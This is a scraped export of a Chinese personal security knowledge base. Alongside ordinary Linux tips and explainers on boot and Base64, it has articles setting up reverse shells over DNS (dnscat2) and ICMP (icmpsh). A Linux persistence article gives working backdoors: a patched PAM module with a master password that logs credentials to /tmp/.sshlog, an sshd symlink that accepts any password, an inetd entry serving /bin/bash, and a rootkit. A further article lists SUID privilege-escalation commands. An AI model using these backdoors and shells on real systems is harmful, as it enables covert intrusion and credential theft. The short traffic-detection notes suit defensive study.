手动挂载虽然也行，但是毕竟不是服务器，不会不关机，那么就需要开机自动挂载硬盘 自动挂载 使用blkid命令查看磁盘uuid sudo blkid 可以看到/dev/sda1就是我的硬盘，Type是ext4，需要关注一下Type，linux 分区一般为 ext4，windows 分区一般为 ntfs 编辑/etc/fstab，将分区信息写入 /etc/fstab 文件启动自动挂载 sudo vim /etc/fstab UUID=744c071c-5e78-4dab-9d4c-cac5ea8e975d /my_HD ext4 defaults 0 1 注： ：分区定位，可以给UUID或LABEL，例如：UUID=6E9ADAC29ADA85CD或LABEL=software ：具体挂载点的位置，例如：/data：挂载磁盘类型,linux 分区一般为 ext4，windows 分区一般为 ntfs ：挂载参数，一般为defaults ：磁盘检查，默认为0 ：磁盘检查，默认为0，不需要检查 第一个叫fs_freq,用来决定哪一个文件系统需要执行dump操作，0就是不需要； 第二个叫fs_passno,是系统重启时fsck程序检测磁盘的顺序号 1 是root文件系统，2 是别的文件系统。fsck按序号检测磁盘，0表示该文件系统不被检测 dump 执行ext2的文件系统的备份操作 fsck 检测和修复文件系统 修改完成之后，执行 sudo mount -a rpm 包与 deb包相互转换 sudo apt intall alien sudo alien XMind-for-Linux-x86-64bit-11.0.1-202106220606.rpm Linux 执行命令时错误返回在shell时，如何将其去掉？ 一般正常情况下，shell会将所有的信息返回回来，如果此时需要去除错误，只需要执行成功的信息，只需要将错误重定向到某个文件即可，我在DNS隧道反弹shell总结过，其中xxx 表示执行的代码，2表示错误 xxx 2 > error windows 和 Linux shell的转义符 写一个一句话 # windows echo ^ > test.php # Linux echo \"\" > test.php echo \\ > test.php windows、Linux 在终端中如何设置临时代理 临时代理设置如下 windows cmd shell set http_proxy=127.0.0.1:10809 set https_proxy=127.0.0.1:10809 powershell $env:HTTP_PROXY=\"127.0.0.1:10809\" $env:HTTPS_PROXY=\"127.0.0.1:10809\" Linux export http_proxy=127.0.0.1:10809 export https_proxy=127.0.0.1:10809 Linux 更新系统字体 首先下载tff文件 然后执行如下命令 sudo mkdir /usr/share/fonts/msyh sudo cp *.ttf /usr/share/fonts/msyh/ sudo fc-cache -fv JDK1.7 在macos版本的idea 运行警告 /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/bin/java \"-javaagent:/Applications/IntelliJ IDEA.app/Contents/lib/idea_rt.jar=63173:/Applications/IntelliJ IDEA.app/Contents/bin\" -Dfile.encoding=UTF-8 -classpath /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/charsets.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/deploy.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/dnsns.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/localedata.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/sunec.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/sunjce_provider.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/sunpkcs11.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/zipfs.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/htmlconverter.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/javaws.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jce.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jfr.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jfxrt.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jsse.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/management-agent.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/plugin.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/resources.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/rt.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/ant-javafx.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/dt.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/javafx-doclet.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/javafx-mx.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/jconsole.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/sa-jdi.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/tools.jar:/Users/aaronluo/Documents/CodeReview/JavaCode/Project/target/classes:/Users/aaronluo/.m2/repository/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar:/Users/aaronluo/Documents/CodeReview/JavaCode/commons-collections-3.1/commons-collections-3.1.jar:/Users/aaronluo/Documents/CodeReview/JavaCode/commons-collections4-4.0/commons-collections4-4.0.jar com.myproject.TestCC7 objc[20911]: Class JavaLaunchHelper is implemented in both /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/bin/java (0x1081794c0) and /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/libinstrument.dylib (0x10833f4e0). One of the two will be used. Which one is undefined. Process finished with exit code 0 该问题主要出现于 Mac 版本的 IntelliJ IDEA 之中，而引起该问题的原因，则是 Mac 中 JDK 的一个 BUG，如果你是jdk1.8.0_152之前的版本。它是由启动应用程序时 IDE 使用的 Java 代理触发的，此警告是无害的，我们可以安全地忽略，并且该问题已经在后续的 JDK 中得到了解决。 解决方式 既然该问题是由于 IDEA 启用代理引起的，那么我们禁止 IDEA 启动代理，即可解决该问题。 添加如下所示，并重启idea即可 idea.no.launcher=true 当然还可以升级JDK 到1.8.0_152+ MacOS docker 换源 安装好macos 下的docker 之后，直接点击Preferences，或者在桌面版点击齿轮图标，选中Docker Engine 修改如下 { \"debug\": true, \"experimental\": false, \"registry-mirrors\": [ \"https://docker.mirrors.ustc.edu.cn\", \"https://hub-mirror.c.163.com\" ] } 最后点击右下角的apply & Restart 在命令行执行docker info命令就可以看到换好后的源 Kali 2019.4 换源之后，apt update 报错 root@kali:/usr# apt-get update 获取:1 http://mirrors.ustc.edu.cn/kali kali-rolling InRelease [30.5 kB] 错误:1 http://mirrors.ustc.edu.cn/kali kali-rolling InRelease 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository 已下载 30.5 kB，耗时 0秒 (32.6 kB/s) 正在读取软件包列表... 完成 W: 校验数字签名时出错。此仓库未被更新，所以仍然使用此前的索引文件。GPG 错误：http://mirrors.ustc.edu.cn/kali kali-rolling InRelease: 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository W: 无法下载 http://mirrors.ustc.edu.cn/kali/dists/kali-rolling/InRelease 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository 解决方案 从官网下载签名并安装 wget archive.kali.org/archive-key.asc apt-key add archive-key.asc Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:38:58 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/01.主机乱七八糟的问题汇总（持续更新）.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/02.计算机从加电到启动系统的过程（Linux）.html":{"url":"知识库/03.主机安全/02.计算机从加电到启动系统的过程（Linux）.html","title":"02.计算机从加电到启动系统的过程（Linux）","keywords":"","body":" 简单过程 从加电到BIOS启动 第一步，加电引导寄存器置位 第二步，引导BIOS启动 相关知识学习 BIOS引导加载操作系统镜像 第一步，检查硬件 第二步，初始化硬件 第三步，搜索操作系统 Setup 函数引导内核 内核建立阶段 startup_32()函数 startup_32()函数 内核完善阶段start_kernel函数 简单过程 BIOS启动主动执行的固件，去认识第1个可启动设备 第一个可启动设备的第一个扇区的主引导块MBR，内含启动引导代码 bootloader（启动引导程序），读取内核文件来执行软件 内核文件启动操作系统 从加电到BIOS启动 第一步，加电引导寄存器置位 这个过程指，计算机加电之后，一个特殊电路会在CPU对应的针脚处产生一个逻辑电平，这个电平的值从针脚进入CPU，会引发寄存器（cs,eip）设置成特定值。 第二步，引导BIOS启动 这一过程指的是系统从物理地址0xfffffff0处加载一段程序到只读内存（ROM-> Read Only Memory），这个程序在80x86体系架构中一般称为BIOS 相关知识学习 MS-DOS的很多系统调用依赖BIOS Linux进入保护模式后不再依赖BIOS，BIOS只能以实模式运行。 实模式的寻址是20位总线寻址，支持的寻址空间为2^20，也就是1MB，保护模式目前在x86结构下，支持4GB寻址; 实际区别主要是EIP中的虚地址到实地址转化的区别： 实模式是seg(eip地址)*16+offset(4为偏移量)； 保护模式实EIP的16位地址代表页面位置，一个页在操作系统中都学习过是4KB，1M*4K = 4G，我相信很多人就此理解了为啥页的大小要设计成4K； BIOS引导加载操作系统镜像 第一步，检查硬件 一般可认为是开机加电自检，这个阶段会显示一些信息，包括BIOS版本这一类的信息 第二步，初始化硬件 主要是避免IRQ先与I/O冲突，本阶段最后会显示所有PCI（总线--内部硬件通信线路）设备信息 第三步，搜索操作系统 从软盘、网络、磁盘、CD-ROM的主引导扇区上搜索。找到后加载到扇区的内容到0x00007c00的位置（RAM中），跳转到这个地址，开始执行这段代码，这段程序叫做bootloader。 由于大小限制，linux的启动程序GRUB（GRand Unified BootLoader）或者是LILO（LInux LOader）被分为两部分。 第一部分就是加载到0x00007c00的这一段，他会把自己移动到0x00096a00的位置，建立实模式栈（0x00098000~0x000969ff） 第一部分吧第二部分加载到0x00096c00开始的位置中。 以上的位置都是在RAM中。 第二部分搜索磁盘上的OS景象，，把对应的扇区拷贝到RAM中执行： 1、首先把内核景象的第一个512B的部分从0x00090000处装入RAM中； 2、把setup()函数代码段装入0x00090200位置(RAM); 3、加载其他内核部分从高（0x00100000）或低（0x00010000）两个位置任选其一加载到RAM中，分别称为大映像内核和小映像内核； 4、跳转到setup函数执行； Setup 函数引导内核 这个过程主要是检查和初始化硬件、虽然BIOS完成了相似的大部分工作，但是因为不依赖与BIOS，所以，还是重新初始化了硬件方面的事情；重要的过程有： 移动低装载小映像内核的位置到0x00001000去，如果是高装载则不移动; 建立IDT（临时中断描述符表）和GDT（临时全局描述符表）； 如果需要，重置浮点单元（FPU）； 重新编写可编程终端控制器（PIC），屏蔽除IRQ2外的所有终端； 设置cr0寄存器到PE位，设置PG位为0，切换到保护模式，暂未启用分页； 跳转到startup_32()函数； 内核建立阶段 startup_32()函数 主要做的事如下： 初始化段寄存器和一个临时堆栈，并清零eflags寄存器所有为； 用0填充_edata 和_end符号标识的内核未初始化数据区； 调用decompress_kernel函数解压内核映像； 【低装载的情况解压内容放在0x00100000位置开始的RAM中，高装载的放在这后面的一个临时缓冲区内，解压后的内核就被移动到0x00100000位置】 跳转到0x00100000位置开始执行,新的执行点事arch/i386/kernerlhead.s中的另一个startup_32函数。 startup_32()函数 这个函数就是init进程(也就是pid = 0 的 0号进程)，主要做了以下工作 段寄存器初始化为最终值，内核的bss段填写为0； 初始化临时内核页表，初始化pg0，使得线性地址一律映射到统一的物理地址上； cr3寄存器保存了页全局目录，并设置cr0的pg位启用分页； 清零eflags，使用setup_idt函数用空的终端处理程序填充IDT； 从bios获取的数据（系统参数和传递给os的参数）放入页框1； 识别处理器、用GDT和IDT填充gdtr和idtr寄存器； 跳转到start_kernel函数内核完善阶段start_kernel函数 这一阶段最终完善了内核的初始化的后续工作，启动了程序调度、内存管理等操作系统的功能，其中就涉及到了著名的函数sched_init函数，至此，系统完全启动成功 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:35 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/02.计算机从加电到启动系统的过程（Linux）.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/03.Base64编码解码原理.html":{"url":"知识库/03.主机安全/03.Base64编码解码原理.html","title":"03.Base64编码解码原理","keywords":"","body":" base64 索引表 编码 解码 参考文档 base64 编码是使用64个可打印的字符的ASCII字符（0-9、A-Z、a-z、+、\\）将任意字节序列数据编码成ascii码而成的一种算法，另有“=”符号用作后缀补位 base64 索引表 编码 ASCII码一共有256位(00000000-11111111)，因为1个字节有8bit，所以是8bit表示对应一个ASCII码 base64 编码，一共有64个可见字符，那么用二进制表示0-63，则是0 - (26 -1)=>000000-111111，所以对应的是6bit表示一个base64码 当ascii码转成base64码时，因为8和6的最小公倍数为24，24/8=3，24/6=4，表示每3个ascii码为1组，转换为4个base64码 abc => 01100001 01100010 01100011 011000 010110 001001 100011 => 24、22、9、35 YWJj 编码过程中，如果字符串不是3的倍数，那么就需要补位，就需要在后面添加=,如果8n mod 6 =2 那么需要补两个=，如果8n mod 6 = 4 需要补1个=，如果8n mod 6 = 0 则不需要=, (n为ascii码数量) abcd => 4*8 / 6 = 5 ...... 2 => 8*n mod 6 = 2 => 当余数=2的时候，要正常编码，bit数一定要为24的倍数，32+m = 24*n (n取最小值2) 所以需要补的bit数为48-32=16 => 需要补的16 位当中，已经有2位等待补0，那么按6bit一个base64码，需要补4位0，其余12位就补x（也就是两位=） 01100001 01100010 01100011 01100100 011000 010110 001001 100011 011001 00 0000 xxxxxx xxxxxx =>24、22、9、35、25、0、=、= YWJjZA== => 8n mod 6 = 4 的情况，8n = 16 n=2的时候，需要补2个00,然后再补6位x才满足16+8=24，可以被base64编码 ab => YWI= 所以记住 当8*n mod 6 = 2需要补16个bit，4个bit填充0，12个bit填充x，也就是两个= 8*n mod 6 = 4,需要补8个bit，其中2个bit填充0，6个填充x，也就是1个= mod运算在数论中学过，8n mod 6 这个等式等价于8 mod 6,在ascii 和 base64码相互转换，一定要满足待转换数的bit数为`24n` 解码 相信此时您已经了解了编码过程，那么对于解码来说就很简单了 编码过程中，是将3个字符编码成4个base64码，那么解码过程就是将4个base64码解码成3个ascii码（每8个bit一组，组合成一个ascii码） 对应如下： YWJj 011000 010110 001001 100011 01100001 01100010 01100011 => 97 98 99 abc 那么如果有=的该怎么计算对应的解码后的字符个数呢？ 如YMI=base64 编码的字符个数有4个，那么对应解码的字符个数为3个，又因为=为补位，需要减去，那么公式为n * 6 - 8 * m / 8 => (3 * n / 4)- m(化简后)（其中m为=个数，n 为base64码个数） 例：YWJjZA==解码后字符个数为 3 * 8 / 4 - 2 = 4 YWJjZA== 011000 010110 001001 100011 011001 00 0000 xxxxxx xxxxxx 01100001 01100010 01100011 01100100 (后面的0000 xxxxxx xxxxxx 为补位，在解码过程中需要去掉) => 97 98 99 100 abcd 所以记住，当解码base64码的时候： 当编码有1个= ，减去8个bit，如YMI=,(3 * n / 4) - m = 3*4/4-1 = 2 (n=4,m=1) 当编码有2个= ，减去16个bit，如YWJjZA==,(3*n / 4) -m = 3*8/4-2 = 4(n=8,m=2)参考文档 https://www.cnblogs.com/vege/p/12675562.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:35 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/03.Base64编码解码原理.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/04.DNS隧道反弹shell.html":{"url":"知识库/03.主机安全/04.DNS隧道反弹shell.html","title":"04.DNS隧道反弹shell","keywords":"","body":" DNS介绍 DNSCat2 工具介绍 DNSCat2 环境搭建 LInux 客户端搭建 Linux 服务端搭建 反弹shell 错误分析 流量检测 特征dnscat 域名特征 对比正常dns 解析流量包 项目地址：https://github.com/iagox86/dnscat2 DNS介绍 DNS是域名系统(Domain Name System)的缩写，是因特网的一项核心服务，它作为可以将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。 DNS的记录类型有很多，有A，AAAA,CNAME,MX,SOA,NS等。 DNS Tunneling可以利用其中的一些记录类型来传输数据。例如A，MX，CNAME,TXT，NULL等。 A记录：A记录是用来指定主机名对应的ip地址记录，简单的说A记录是指定域名对应的IP地址。 AAAA记录：记录将域名解析到一个指定的ipv6的ip上 CNAME记录，别名解析。可以将注册不同的域名解析到一个ip地址。 NS记录：域名服务器记录，用来指定该域名是由哪个DNS服务器进行解析。 MX记录:指向的是一个邮件服务器。 TXT记录：一般是指某个主机名或域名的说明 PTR记录：反向DNS DNS的解析过程可以分为两种类型：迭代查询和递归查询。通常本机到Local DNS Server的过程属于递归查询，而Local DNS Server对查询域名的解析过程属于迭代查询。为了减轻Local DNS Server的压力，提高解析速度，引入了缓存机制。缓存和TTL紧密相连，当TTL过期，Local DNS Server则会丢弃缓存的数据，重新从权威域名服务器上获取新的数据。 本地客户端---->Local DNS server---->根域服务器 Dns解析过程：系统发出dns解析之前会先看看本地是否保存了相关域名的解析，系统检测到hosts文件中没有响应的域名解析的时候会发送给本地dns解析服务器进行解析，解析之前会看看缓存中是否存在，如果没有，再将解析请求发给下一个dns服务器。结果返回后将该域名的解析结果保存到缓存中。 DNSCat2 工具介绍 Dnscat2是一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道。 Dnscat2分为client端和server端，client运行在被控机器上，server运行在DNS服务器上。client，server部分分别是用C，ruby写的。其中作者在实现client部分时实现了跨平台，支持linux和windows编译运行。在完成连接建立后可以实现建立shell，上传下载文件等功能。 DNSCat2 环境搭建 LInux 客户端搭建 git clone https://github.com/iagox86/dnscat2 cd dnscat2/client/ make Linux 服务端搭建 # 有ruby 环境下 # 无ruby 环境 apt install ruby-full，我的ruby是2.7 cd dnscat2/server gem install bundler apt install ruby-dev bundler install 反弹shell 首先在服务端运行 # root 模式下 cd dnscat2/server ruby dnscat2.rb 然后在服务端banner信息中可以看到，如下所示的命令，在客户端处执行 cd dnscat2/client make ./dnscat --dns server=127.0.0.1,port=53 --secret=c229df179cba2226828cd03ff13859a4 在服务端执行 windows -a 进入会话 window -i 1 退出当前通道，进入shell suspend windows -a window -i 2 错误分析 地址被占用 netstat -ntlp # 关闭之后无法上网，这个是dns解析 systemctl stop systemd-resolved.service 运行服务端之后，一直告知warning: Capturing the given block using Kernel#proc is deprecated; use&blockinstead # 将错误重定向到指定文件即可 ruby dnscat2.rb 2> error 流量检测 在使用dnscat2 利用dns隧道进行反弹shell，那么作为防守方该如何检测呢？ 特征dnscat 首先在客户端处，会向恶意服务端发送dns请求，且会一直发送，包里都有相同的特征dnscat 域名特征 其次可以看到解析的域名很长，不符合正常域名 对比正常dns 解析流量包 正常dns域名解析包如下，通过对比可以发现dnscat2 的特征是非常明显的，正常包是不会有加密 [ ](https://github.com/iagox86/dnscat2) Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:30 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/04.DNS隧道反弹shell.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/05.ICMP隧道反弹shell.html":{"url":"知识库/03.主机安全/05.ICMP隧道反弹shell.html","title":"05.ICMP隧道反弹shell","keywords":"","body":" 背景 ICMPSH 使用方法 条件 两个问题 项目地址：https://github.com/bdamele/icmpsh 背景 很多时候网络运维人员只会允许流量进入已知主机，端口和服务（在入口处过滤），当身处DMZ区域，通过TCP获取反向shell是不可能的，但是如果使用UDP（DNS隧道）或者icmp那么还是可以尝试 ICMPSH icmpsh是由python2 编写的，Linux 默认自带python2，但是无pip2，下载pip2()，然后下载项目(git clone ) // 下载pip2 wget https://bootstrap.pypa.io/pip/2.7/get-pip.py // 安装pip2，默认python 版本是python2 python get-pip.py // 下载项目 git clone https://github.com/bdamele/icmpsh 使用方法 条件 攻击机关闭icmp回应包 受害机能发送icmp包到攻击机 pip install impacket -i https://pypi.douban.com/simple // 首先在攻击机上关闭icmp回显 sysctl -w net.ipv4.icmp_echo_ignore_all=1 // 其次，192.168.93.131是攻击机 python icmpsh_m.py 192.168.93.131 192.168.93.134 // 最后，在受害机执行 icmpsh.exe -t 192.168.93.131 两个问题 当前演示的环境是windows，那么受害机是Linux如何getshell ？ Linux 主机暂时未找到解决办法。。 为什么使用虚拟机（NAT模式下），主机作为受害者却始终不能getshell ？ 因为NAT模式是交换机NAT，从宿主机走出来的流量要先经过192.168.93.1 然后才能走到192.168.93.131(攻击机)，所以我们需要监听的是交换机的地址 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:35 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/05.ICMP隧道反弹shell.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/06.Linux权限维持.html":{"url":"知识库/03.主机安全/06.Linux权限维持.html","title":"06.Linux权限维持","keywords":"","body":" 背景 计划任务(Crontab) Authorized key 持久化 Open SSH 后门 SSH PAM 后门 SSH 软连接 后门 Vim 后门 alias 后门 inetd 后门 mafix 后门 背景 在拿到一台主机（Linux）的普通权限，或最高权限（uid=0），则要开始进行后渗透阶段，如果当Session断掉之后，能够迅速上线该主机，那么就需要维持该Session的权限了 计划任务(Crontab) Linux 中同步计划任务有如下： 系统级别的计划任务 /etc/crontab /etc/cron.*/ 用户级别的计划任务 /var/spool/corn/* 相对应的语法如下所示（这里以系统级别的计划任务举例） minute hour day month day of week user-name command to be executed 优点 缺点 无需编译，配置简单 易排查，设备上容易产生告警 Authorized key 持久化 攻击者在本地生成公私钥对 # 输入以下命令会在~/.ssh/目录下创建两个文件，分别是id_rsa,id_rsa.pub ssh-keygen -b 4096 -t rsa 在受害机已经获取权限的用户目录下执行 vi ~/.ssh/authorized_keys # 将刚刚生成的id_rsa.pub内容粘贴到authorized_keys文件中，如果该文件原来存在内容，就另起一行 chmod 600 ~/.ssh/authorized_keys chmod 700 ~/.ssh 使用自己的私钥登录该系统 如果只有一对公私钥可以不用指定私钥，ssh客户端在登录的时候会寻找/.ssh/id_rsa 优点 缺点 利用简单，攻击行为接近正常登录，一般不会触发告警 容易排查 Open SSH 后门 # 下载openssh-5.9p1.tar.gz openssh-5.9p1.patch.tar.gz tar zxf openssh-5.9p1.tar.gz tar zxf openssh-5.9p1.patch.tar.gz cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1 patch 修改include.h，默认将ssh登录该服务器的密码存储在/tmp/ilog 和 该服务器登录远程服务器的明文密码存储在/tmp/olog，SECRETPW 为 在受害机ssh登录服务器 使用apaajaboleh登录 优点 缺点 隐蔽性较强，攻击行为接近正常登录，不易触发其他告警。 需要编译环境，缺少GCC或其他依赖包容易出现问题，相对容易排查 SSH PAM 后门 PAM 是 Linux 默认的 SSH 认证登录机制，可以通过修改源码实现万能密码，记录登录密码等功能 # 首先查看PAM版本，需要有gcc编译环境 rpm -qa | grep pam tar zxvf Linux-PAM-1.1.8.tar.gz cd Linux-PAM-1.1.8 # 修改源码 vim modules/pam_unix/pam_unix_auth.c # 添加代码 if(strcmp(\"PAM\",p)==0){return PAM_SUCCESS;} if(retval == PAM_SUCCESS){ FILE * fp; fp = fopen(\"/tmp/.sshlog\", \"a\"); fprintf(fp, \"%s : %s\\n\", name, p); fclose(fp); } # 预编译 ./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr # 编译，编译前可能会报错需要安装flex 和 flex-devel yum install flex flex-devel -y make 预编译 编译 # 编译完成之后，动态链接库在Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so # 查找系统原so文件默认存储在/usr/lib64/security/pam_unix.so find / -name pam_unix.so # 备份原pam文件和替换恶意pam文件 mv /usr/lib64/security/pam_unix.so /usr/lib64/security/pam_unix.so.bak mv /home/aaron/Desktop/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so 使用正常密码登录，可以在/tmp/.sshlog文件找到登录密码，使用我们留的密码（PAM）登录也可以 优点 缺点 攻击行为接近正常登录，不会触发其他告警 容易排查，需要编译环境 SSH 软连接 后门 # 通过软连接建立一个ssh后门 ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345 原理： Linux软连接ssh后门，通过PAM认证方式登录 将sshd文件软连接名称设置为su ,实质上PAM认证是通过软连接的文件名(如:/usr/local/su)在/etc/pam.d/目录下寻找对应的PAM配置文件(如:/etc/pam.d/su) 任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆 建立软连接到/usr/local/su 文件，也可以在其他目录，su文件名字不能变，变了就无法登录。当然可以通过其他设置，更改su名字也是可以的。然后启动，并指定监听12345端口，登录的时候密码随意即可，登录如下： 使用root/任意密码即可登录成功 优点 缺点 攻击行为接近正常登录，不会触发其他告警 容易被排查 Vim 后门 修改/etc/vimrc 或者/etc/.vimrc，每次启动vim 执行恶意脚本，vim 支持python，构建python 反弹shell vim /etc/vimrc 优点 缺点 利用简单 持久化效果一般，易暴露 alias 后门 alias 是Linux的命令的别名，存储在~/.bashrc(这里只讨论bash shell)中，修改之后再使用命令，当再使用ls时，就会反弹shell source ~/.bashrc 优点 缺点 利用简单 容易被发现，持久化效果一般 inetd 后门 通俗来讲就是一个监听外部网络请求 [就是一个socket] 的系统守护进程,其实有很多比较古老的服务都是基于此守护进程 # 安装inetd apt install openbsd-inetd # 可以直接用service中定义好的服务，只需要把实际的处理程序替换下即可 vim /etc/services fido 60179/tcp # fidonet EMSI over TCP # 配置inetd.conf 并启动inetd vim /etc/inetd.conf fido stream tcp nowait root /bin/bash -i # 当外部请求为fido的服务时，就反弹一个交互式的shell systemctl restart inetd nc -vv [host] [port] 优点 缺点 利用简单 有反连shell告警 mafix 后门 下载地址：https://github.com/yzimhao/godpock/tree/master/Rootkit tar zxvf mafix.tar.gz cd mafix.tar.gz ./root 密码 端口 # 攻击机 使用如下命令 # centos 7 还支持ssh1，windows，Debian、Ubuntu ssh客户端不支持ssh1 ssh -1 root@xxx.xxx.xxx.xxx -p port 优点 缺点 无需编译，配置简单 会替换ls等命令，容易被识破 环境依赖较高，在Ubuntu，centos上测试不通过，Ubuntu缺少依赖，centos会死机，在Debian上顺利通过 | Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:07 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/06.Linux权限维持.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/07.Linux_SUID提权原理.html":{"url":"知识库/03.主机安全/07.Linux_SUID提权原理.html","title":"07.Linux_SUID提权原理","keywords":"","body":" 基本原理 原理验证 实战利用 问题思考 bash shell 不是以root启动 使用root启动python，但是用户还是低权限用户 基本原理 chmod命令可以改变文件或者路径的一些权限属性。在chmod的众多参数中，有一个s参数引发了一个重大的问题。s参数的含义是允许程序临时以所有者权限运行。其使用命令如下： #chmod +s targetfile chmod +s ./exp 原理验证 编写如下代码 persist.c #include #include #include int main(){ setuid(0); system(\"cat /etc/shadow\") return 0; } 在root权限下编译 gcc persist.c -o persist 在普通用户权限下执行 在root用户下添加s权限，并在普通用户下执行 实战利用 可常用命令如下 nmap --interactive \\ !sh find . -type f -exec /bin/bash ; awk 'BEGIN {system(\"/bin/bash\")}' strace -o/dev/null /bin/bash 寻找本机器环境下的s属性程序 find / -perm -u=s -type f 2>/dev/null 使用find提权 问题思考 在这里很疑惑两点 bash shell 不是以root启动 find 提权使用bash shell 命令是以root 启动，但是给的bash shell 启动权限是低权限用户 使用root启动python，但是用户还是低权限用户 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:15 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/07.Linux_SUID提权原理.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/08.Linux的账号口令机制及其爆破.html":{"url":"知识库/03.主机安全/08.Linux的账号口令机制及其爆破.html","title":"08.Linux的账号口令机制及其爆破","keywords":"","body":" 账号保存 /ect/passwd /ect/shadow 认证流程 破解方式 原理介绍 Test 账号保存 谈到linux的账号认证，其实就是如何保存于通过口令(password)鉴别，这里首先要讲两个文件，一个是/etc/passwd，另外一个是/etc/shadow文件 我们先来看/etc/passwd 文件 /ect/passwd 我们来解释一下这张图片，说明一下/etc/passwd文件的格式：用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell，我们来说几个重点字段 口令： 因为安全问题，放在/etc/shadow中去了 用户标识号：uid 组标识号：gid 主目录：用户主目录 登录shell：当为nologin的时候其实是无法登录的 /ect/shadow 我们来解释一下这张图片，说明一下/etc/shadow文件的格式：用户名:$加密方式$盐字符串$密文口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志，我们来说几个重点字段。 加密方式：6->sha-512加密，1->md5加密，2->Blowfish加密，5->sha-256加密 盐：加盐对抗破解的那个随机字符串 密文口令：和盐一起经过f(password,key)运算后得到的值认证流程 